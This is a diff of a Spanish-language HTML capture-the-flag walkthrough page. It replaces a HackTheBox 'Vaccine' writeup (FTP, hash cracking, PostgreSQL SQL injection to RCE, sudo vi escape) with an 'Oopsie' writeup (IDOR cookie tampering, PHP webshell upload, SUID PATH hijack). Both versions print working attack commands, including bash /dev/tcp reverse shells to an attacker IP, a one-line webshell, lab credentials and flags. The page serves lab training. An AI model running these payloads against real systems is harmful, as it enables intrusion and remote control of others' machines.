@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Vaccine — HTB Writeup | YRD</title>
+  <title>Oopsie — HTB Writeup | YRD</title>
   <style>
-    :root{--bg:#050a05;--card-bg:#0a1a0a;--border:#1a3d1a;--primary:#39d353;--cyan:#64ffda;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#8b949e;--red:#ff6b6b;--yellow:#ffd93d;}
+    :root { --bg:#050a05;--card-bg:#0a1a0a;--border:#1a3d1a;--primary:#39d353;--cyan:#64ffda;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#8b949e;--red:#ff6b6b;--yellow:#ffd93d; }
     *{margin:0;padding:0;box-sizing:border-box;}
     body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;}
     canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.13;pointer-events:none;z-index:0;}
@@ -14,7 +14,7 @@
     .nav-logo svg{width:32px;height:32px;}
     .nav-logo span{font-size:1.1rem;font-weight:700;color:var(--primary);letter-spacing:2px;}
     .nav-links{display:flex;gap:2rem;}
-    .nav-links a{color:var(--text-dim);text-decoration:none;font-size:0.9rem;}
+    .nav-links a{color:var(--text-dim);text-decoration:none;font-size:0.9rem;transition:color 0.2s;}
     .nav-links a:hover{color:var(--primary);}
     .back-bar{position:relative;z-index:10;background:var(--card-bg);border-bottom:1px solid var(--border);padding:0.75rem 2rem;display:flex;align-items:center;gap:1rem;}
     .back-btn{color:var(--primary);text-decoration:none;font-size:0.85rem;}
@@ -44,9 +44,15 @@
     .section-icon{width:8px;height:8px;background:var(--primary);border-radius:50%;box-shadow:0 0 8px var(--primary);}
     .section h2{font-size:1.1rem;font-weight:700;color:var(--primary);text-transform:uppercase;letter-spacing:2px;}
     .section p{color:var(--text-dim);line-height:1.8;margin-bottom:0.75rem;}
+    .section p:last-child{margin-bottom:0;}
     pre{background:#020c02;border:1px solid var(--border);border-radius:8px;padding:1.25rem;overflow-x:auto;margin:1rem 0;font-size:0.82rem;line-height:1.6;}
     code{font-family:'Cascadia Code','Fira Code','Courier New',monospace;}
-    .comment{color:#6a9955;}.cmd{color:var(--cyan);}.output{color:var(--text-dim);}.highlight{color:var(--primary);font-weight:600;}.cred{color:var(--yellow);font-weight:600;}.flag-val{color:#ff79c6;}
+    .comment{color:#6a9955;}
+    .cmd{color:var(--cyan);}
+    .output{color:var(--text-dim);}
+    .highlight{color:var(--primary);font-weight:600;}
+    .cred{color:var(--yellow);font-weight:600;}
+    .flag-val{color:#ff79c6;}
     .flags-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1rem;}
     .flag-card{background:#020c02;border:1px solid var(--border);border-radius:10px;padding:1.25rem;}
     .flag-card .flag-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem;}
@@ -99,23 +105,23 @@
 
 <div class="back-bar">
   <a class="back-btn" href="#">← Back</a>
-  <span class="breadcrumb">Machine — <span>Vaccine (HTB)</span></span>
+  <span class="breadcrumb">Machine — <span>Oopsie (HTB)</span></span>
 </div>
 
 <div class="hero">
-  <div class="hero-breadcrumb"><a href="#">HTB Máquinas</a> / <a href="#">Linux</a> / Vaccine</div>
+  <div class="hero-breadcrumb"><a href="#">HTB Máquinas</a> / <a href="#">Linux</a> / Oopsie</div>
   <div class="tags">
     <span class="tag tag-htb">HACKTHEBOX</span>
     <span class="tag tag-os">LINUX</span>
     <span class="tag tag-easy">EASY</span>
     <span class="tag tag-htb">STARTING POINT</span>
   </div>
-  <h1>Vaccine <span>Machine</span></h1>
-  <p class="hero-desc">Máquina Linux que encadena acceso FTP anónimo con un archivo ZIP cifrado, cracking de contraseñas MD5, inyección SQL en un panel web para RCE vía <code>COPY FROM PROGRAM</code> de PostgreSQL, y escalada de privilegios abusando de permisos sudo sobre <code>vi</code>.</p>
+  <h1>Oopsie <span>Machine</span></h1>
+  <p class="hero-desc">Máquina Linux que explora manipulación de cookies para escalada de privilegios horizontal en una aplicación web, abuso de IDOR para acceder como Super Admin, subida de PHP webshell, y escalada de privilegios vía binario SUID con PATH hijacking.</p>
   <div class="meta-row">
     <div class="meta-item"><span class="meta-label">Autor</span><span class="meta-value green">Yoandy Ramirez Delgado</span></div>
     <div class="meta-item"><span class="meta-label">Tipo</span><span class="meta-value">HTB Starting Point</span></div>
-    <div class="meta-item"><span class="meta-label">Herramienta Clave</span><span class="meta-value">sqlmap / GTFOBins</span></div>
+    <div class="meta-item"><span class="meta-label">Herramienta Clave</span><span class="meta-value">Burp Suite / nc</span></div>
     <div class="meta-item"><span class="meta-label">Objetivo</span><span class="meta-value">root</span></div>
   </div>
 </div>
@@ -125,125 +131,139 @@
 
     <div class="section">
       <div class="section-header"><div class="section-icon"></div><h2>Escenario</h2></div>
-      <p>Vaccine es una máquina Linux del Starting Point de HackTheBox con IP <span class="ip-badge">10.129.12.212</span>. Proporciona un servidor FTP con acceso anónimo que contiene credenciales protegidas en un archivo ZIP. El panel web de administración usa PHP con una base de datos PostgreSQL vulnerable a SQL injection que permite ejecución de comandos del sistema.</p>
+      <p>Oopsie es una máquina Linux del Starting Point de HackTheBox con IP <span class="ip-badge">10.129.86.20</span>. La aplicación web tiene un panel de login para administración de MegaCorp Auto, con una vulnerabilidad de IDOR que permite a un usuario invitado obtener el rol de Super Admin manipulando cookies.</p>
+      <p>Una vez con acceso de Super Admin, se puede subir una PHP webshell. Las credenciales encontradas en archivos del servidor permiten escalar a otro usuario, y un binario SUID con PATH hijacking lleva a root.</p>
     </div>
 
     <div class="section">
       <div class="section-header"><div class="section-icon"></div><h2>Reconocimiento</h2></div>
-      <pre><code><span class="cmd">nmap -sC -sV 10.129.12.212</span>
+      <p><strong>Escaneo Nmap:</strong></p>
+      <pre><code><span class="cmd">nmap -sC -sV 10.129.86.20</span>
 <span class="output">PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 8.0p1
-80/tcp open  http    Apache httpd 2.4.41</span>
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.29</span></code></pre>
 
-<span class="comment"># FTP anónimo</span>
-<span class="cmd">ftp 10.129.12.212</span>
-<span class="output">Name: anonymous
-230 Login successful.
-ftp> ls
-backup.zip</span>
-<span class="cmd">get backup.zip</span></code></pre>
+      <p><strong>Fuzzing de directorios:</strong></p>
+      <pre><code><span class="cmd">gobuster dir -u http://10.129.86.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php</span>
+<span class="output">/uploads     (Status: 301)
+/css         (Status: 301)
+/js          (Status: 301)
+/cdn-cgi/login  (Status: 301)</span></code></pre>
+
+      <p><strong>Login como Guest en <code>/cdn-cgi/login</code>:</strong></p>
+      <pre><code><span class="output">Acceso como invitado → usuario: guest, accesslevel: guest
+Cookie: <span class="cred">user=2233; role=guest</span></span></code></pre>
     </div>
 
     <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Cracking ZIP + MD5</h2></div>
-      <p><strong>El ZIP está protegido por contraseña — cracking con zip2john:</strong></p>
-      <pre><code><span class="cmd">zip2john backup.zip > backup.hash
-john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt</span>
-<span class="highlight">backup.zip:    <span class="cred">741852963</span></span>
+      <div class="section-header"><div class="section-icon"></div><h2>Explotación — IDOR + Cookie Manipulation</h2></div>
+      <p><strong>Enumeración de cuentas vía IDOR en el panel de cuentas:</strong></p>
+      <pre><code><span class="comment"># El parámetro id en /cdn-cgi/login/admin.php?content=accounts&id= es vulnerable a IDOR</span>
+<span class="cmd">curl -s "http://10.129.86.20/cdn-cgi/login/admin.php?content=accounts&id=1" \
+  -H "Cookie: user=2233; role=guest"</span>
+<span class="output">Access ID: <span class="highlight">34322</span>  Name: admin  Email: admin@megacorp.com</span></code></pre>
 
-<span class="cmd">unzip -P 741852963 backup.zip</span>
-<span class="output">  inflating: index.php
-  inflating: style.css</span>
+      <p><strong>Escalada de rol manipulando cookies:</strong></p>
+      <pre><code><span class="comment"># Cambiar la cookie con el Access ID del admin y rol superadmin</span>
+<span class="cred">Cookie: user=34322; role=superadmin</span>
 
-<span class="comment"># Hash MD5 en index.php</span>
-<span class="cmd">grep -i password index.php</span>
-<span class="output">if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {
-  if($_POST['username'] === 'admin' &amp;&amp;
-     md5($_POST['password']) === '<span class="cred">2cb42f8734ea607eefed3b70af13bbd3</span>')</span>
+<span class="comment"># Ahora tenemos acceso a /cdn-cgi/login/admin.php?content=uploads</span>
+<span class="highlight">Panel de subida de archivos desbloqueado</span></code></pre>
 
-<span class="cmd">hashcat -m 0 2cb42f8734ea607eefed3b70af13bbd3 /usr/share/wordlists/rockyou.txt</span>
-<span class="highlight">2cb42f8734ea607eefed3b70af13bbd3:<span class="cred">qwerty789</span></span></code></pre>
+      <p><strong>Subida de PHP webshell:</strong></p>
+      <pre><code><span class="comment"># shell.php</span>
+<span class="output">&lt;?php system($_GET['cmd']); ?&gt;</span>
+
+<span class="cmd">curl -s "http://10.129.86.20/uploads/shell.php?cmd=id"</span>
+<span class="highlight">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+<span class="comment"># Reverse shell</span>
+<span class="cmd">curl "http://10.129.86.20/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.X/4444+0>%261'"</span></code></pre>
+
+      <p><strong>Credenciales en db.php:</strong></p>
+      <pre><code><span class="cmd">cat /var/www/html/cdn-cgi/login/db.php</span>
+<span class="output">$conn = mysqli_connect('localhost','<span class="cred">robert</span>','<span class="cred">M3g4c0rp123</span>','garage');</span>
+
+<span class="cmd">su robert</span>
+<span class="highlight">robert@oopsie:~$ cat user.txt</span>
+<span class="flag-val">f2c74ee8db7983851ab2a96a44eb7981</span></code></pre>
     </div>
 
     <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>SQL Injection → RCE</h2></div>
-      <p><strong>Login con admin:qwerty789 → panel de búsqueda vulnerable a SQLi:</strong></p>
-      <pre><code><span class="cmd">sqlmap -u 'http://10.129.12.212/dashboard.php?search=a' \
-  --cookie="PHPSESSID=&lt;cookie&gt;" \
-  --os-shell</span>
+      <div class="section-header"><div class="section-icon"></div><h2>Escalada de Privilegios — SUID + PATH Hijack</h2></div>
+      <p><strong>Búsqueda de binarios SUID:</strong></p>
+      <pre><code><span class="cmd">find / -perm -4000 -type f 2>/dev/null</span>
+<span class="output">/usr/bin/bugtracker</span>
 
-<span class="output">[INFO] the back-end DBMS is PostgreSQL
-[INFO] the file stager has been successfully uploaded
-os-shell></span>
+<span class="cmd">strings /usr/bin/bugtracker</span>
+<span class="output">...
+cat /root/reports/...</span>
 
-<span class="comment"># Alternativamente, manualmente via COPY FROM PROGRAM:</span>
-<span class="cmd">';CREATE TABLE cmd_exec(cmd_output text);
-COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.X/4444 0>&1"';--</span></code></pre>
+<span class="comment"># El binario ejecuta 'cat' sin ruta absoluta — vulnerable a PATH hijacking</span></code></pre>
 
-      <p><strong>Reverse shell como postgres:</strong></p>
-      <pre><code><span class="cmd">nc -lvnp 4444</span>
-<span class="highlight">postgres@vaccine:/var/lib/postgresql$ id</span>
-<span class="output">uid=111(postgres) gid=117(postgres)</span>
+      <p><strong>PATH Hijacking para obtener root shell:</strong></p>
+      <pre><code><span class="comment"># Crear 'cat' malicioso que ejecute /bin/sh</span>
+<span class="cmd">cd /tmp
+echo '/bin/sh' > cat
+chmod +x cat
+export PATH=/tmp:$PATH</span>
 
-<span class="comment"># Estabilizar TTY</span>
-<span class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
-
-<span class="cmd">cat /var/www/html/dashboard.php | grep -i pass</span>
-<span class="output">$conn = pg_connect("host=localhost dbname=carsdb user=postgres password=<span class="cred">P@s5w0rd!</span>");</span>
-
-<span class="cmd">cat /root/user.txt</span>
-<span class="flag-val">ec9b13ca4d6229cd5cc1e09980965bf7</span></code></pre>
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Escalada de Privilegios — sudo vi</h2></div>
-      <pre><code><span class="cmd">sudo -l</span>
-<span class="output">User postgres may run the following commands on vaccine:
-    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</span>
-
-<span class="comment"># GTFOBins: vi como root → shell escape</span>
-<span class="cmd">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</span>
-<span class="comment"># Dentro de vi:</span>
-<span class="output">:set shell=/bin/bash
-:shell</span>
-
-<span class="highlight">root@vaccine:/var/lib/postgresql# id</span>
-<span class="cred">uid=0(root) gid=0(root)</span>
+<span class="cmd">/usr/bin/bugtracker</span>
+<span class="highlight">root@oopsie:/root# id</span>
+<span class="cred">uid=0(root) gid=0(root) groups=0(root)</span>
 
 <span class="cmd">cat /root/root.txt</span>
-<span class="flag-val">dd6e058e814260bc70e9bbdef2715849</span></code></pre>
+<span class="flag-val">af13b0bee69f8a877c3faf667f7beacf</span></code></pre>
     </div>
 
     <div class="section">
       <div class="section-header"><div class="section-icon"></div><h2>Flags</h2></div>
       <div class="flags-grid">
-        <div class="flag-card"><div class="flag-label">🏴 User Flag</div><div class="flag-hash">ec9b13ca4d6229cd5cc1e09980965bf7</div></div>
-        <div class="flag-card"><div class="flag-label">🏴 Root Flag</div><div class="flag-hash">dd6e058e814260bc70e9bbdef2715849</div></div>
+        <div class="flag-card"><div class="flag-label">🏴 User Flag</div><div class="flag-hash">f2c74ee8db7983851ab2a96a44eb7981</div></div>
+        <div class="flag-card"><div class="flag-label">🏴 Root Flag</div><div class="flag-hash">af13b0bee69f8a877c3faf667f7beacf</div></div>
       </div>
     </div>
 
     <div class="section">
       <div class="section-header"><div class="section-icon"></div><h2>Cadena de Ataque</h2></div>
       <div class="timeline">
-        <div class="timeline-item"><div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div><div class="timeline-content"><div class="timeline-step">Paso 1</div><div class="timeline-title">FTP Anónimo → backup.zip</div><div class="timeline-desc">Acceso FTP anónimo descarga <code>backup.zip</code> con el código fuente del panel de administración.</div></div></div>
-        <div class="timeline-item"><div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div><div class="timeline-content"><div class="timeline-step">Paso 2</div><div class="timeline-title">ZIP Cracking → 741852963</div><div class="timeline-desc">John the Ripper encuentra la contraseña del ZIP. El código fuente revela un hash MD5 de contraseña.</div></div></div>
-        <div class="timeline-item"><div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div><div class="timeline-content"><div class="timeline-step">Paso 3</div><div class="timeline-title">MD5 Cracking → qwerty789</div><div class="timeline-desc">Hashcat rompe el hash MD5 del panel de administración: <code>admin:qwerty789</code>.</div></div></div>
-        <div class="timeline-item"><div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div><div class="timeline-content"><div class="timeline-step">Paso 4</div><div class="timeline-title">SQLi → COPY FROM PROGRAM → RCE</div><div class="timeline-desc">El parámetro de búsqueda del dashboard es vulnerable a SQL injection en PostgreSQL. <code>COPY FROM PROGRAM</code> permite ejecutar comandos del sistema.</div></div></div>
-        <div class="timeline-item"><div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div><div class="timeline-content"><div class="timeline-step">Paso 5</div><div class="timeline-title">dashboard.php → Cred PostgreSQL</div><div class="timeline-desc">El archivo de configuración web contiene la contraseña de postgres: <code>P@s5w0rd!</code>.</div></div></div>
-        <div class="timeline-item"><div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div><div class="timeline-content"><div class="timeline-step">Paso 6</div><div class="timeline-title">sudo vi → GTFOBins → root</div><div class="timeline-desc">Permiso sudo para <code>vi</code> sobre un archivo de config. Shell escape desde vi para obtener root.</div></div></div>
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content"><div class="timeline-step">Paso 1</div><div class="timeline-title">Web Enumeration → Panel de Login</div><div class="timeline-desc">Gobuster descubre <code>/cdn-cgi/login</code>. Login como Guest con acceso limitado a la aplicación de gestión.</div></div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content"><div class="timeline-step">Paso 2</div><div class="timeline-title">IDOR → Access ID del Admin</div><div class="timeline-desc">El parámetro <code>id</code> en el panel de cuentas expone el Access ID del administrador: 34322.</div></div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content"><div class="timeline-step">Paso 3</div><div class="timeline-title">Cookie Manipulation → Super Admin</div><div class="timeline-desc">Modificación de cookies a <code>user=34322; role=superadmin</code> para acceder al panel de subida de archivos.</div></div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content"><div class="timeline-step">Paso 4</div><div class="timeline-title">PHP Shell Upload → RCE como www-data</div><div class="timeline-desc">Subida de webshell PHP al directorio <code>/uploads/</code>. Ejecución de comandos como www-data y obtención de reverse shell.</div></div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content"><div class="timeline-step">Paso 5</div><div class="timeline-title">db.php → Credenciales de Robert</div><div class="timeline-desc">Archivo <code>db.php</code> contiene credenciales: <code>robert:M3g4c0rp123</code>. Escalada horizontal a usuario robert con user flag.</div></div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content"><div class="timeline-step">Paso 6</div><div class="timeline-title">SUID bugtracker + PATH Hijack → root</div><div class="timeline-desc">Binario SUID <code>bugtracker</code> llama a <code>cat</code> sin ruta absoluta. PATH hijacking con <code>cat</code> malicioso en /tmp → root shell.</div></div>
+        </div>
       </div>
     </div>
 
     <div class="section">
       <div class="section-header"><div class="section-icon"></div><h2>MITRE ATT&amp;CK</h2></div>
       <div class="mitre-grid">
-        <span class="mitre-tag">T1021.001 — FTP Anonymous</span>
-        <span class="mitre-tag">T1110.002 — Password Cracking</span>
-        <span class="mitre-tag">T1190 — SQL Injection</span>
-        <span class="mitre-tag">T1059 — Command Execution (PostgreSQL)</span>
+        <span class="mitre-tag">T1083 — File Discovery</span>
+        <span class="mitre-tag">T1565.002 — IDOR</span>
+        <span class="mitre-tag">T1539 — Cookie Theft/Manipulation</span>
+        <span class="mitre-tag">T1505.003 — Web Shell</span>
         <span class="mitre-tag">T1552.001 — Credentials in Files</span>
-        <span class="mitre-tag">T1548.003 — Sudo GTFOBins</span>
+        <span class="mitre-tag">T1574.007 — PATH Interception</span>
+        <span class="mitre-tag">T1548.001 — SUID Abuse</span>
       </div>
     </div>
 
@@ -254,27 +274,27 @@ COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.X/4444 0>&1"';
       <h3>Detalles del Reto</h3>
       <div class="detail-row"><span class="detail-key">Dificultad</span><span class="detail-val green">Easy</span></div>
       <div class="detail-row"><span class="detail-key">Sistema Operativo</span><span class="detail-val">Linux</span></div>
-      <div class="detail-row"><span class="detail-key">IP Target</span><span class="detail-val cyan">10.129.12.212</span></div>
+      <div class="detail-row"><span class="detail-key">IP Target</span><span class="detail-val cyan">10.129.86.20</span></div>
       <div class="detail-row"><span class="detail-key">Tipo</span><span class="detail-val">Starting Point</span></div>
-      <div class="detail-row"><span class="detail-key">Vectores</span><span class="detail-val">SQLi, FTP</span></div>
+      <div class="detail-row"><span class="detail-key">Vectores</span><span class="detail-val">IDOR, SUID</span></div>
       <div class="detail-row"><span class="detail-key">CVE</span><span class="detail-val">—</span></div>
     </div>
     <div class="sidebar-card">
       <h3>Skills Demostradas</h3>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">Password Cracking</span><span class="skill-pct">93%</span></div><div class="skill-bar"><div class="skill-fill" style="width:93%"></div></div></div>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">SQL Injection (PostgreSQL)</span><span class="skill-pct">90%</span></div><div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div></div>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">Linux Privesc (sudo)</span><span class="skill-pct">88%</span></div><div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div></div>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">GTFOBins Techniques</span><span class="skill-pct">85%</span></div><div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">IDOR Exploitation</span><span class="skill-pct">92%</span></div><div class="skill-bar"><div class="skill-fill" style="width:92%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">Cookie Manipulation</span><span class="skill-pct">88%</span></div><div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">PHP Web Shell</span><span class="skill-pct">90%</span></div><div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">Linux PrivEsc (PATH)</span><span class="skill-pct">85%</span></div><div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div></div>
     </div>
     <div class="sidebar-card">
       <h3>Herramientas</h3>
       <div class="tools-list">
         <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nmap</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">zip2john / john</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">hashcat</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">sqlmap</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">gobuster</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">Burp Suite</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">curl</span></div>
         <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nc (netcat)</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">vi (GTFOBins)</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">find (SUID)</span></div>
       </div>
     </div>
   </div>
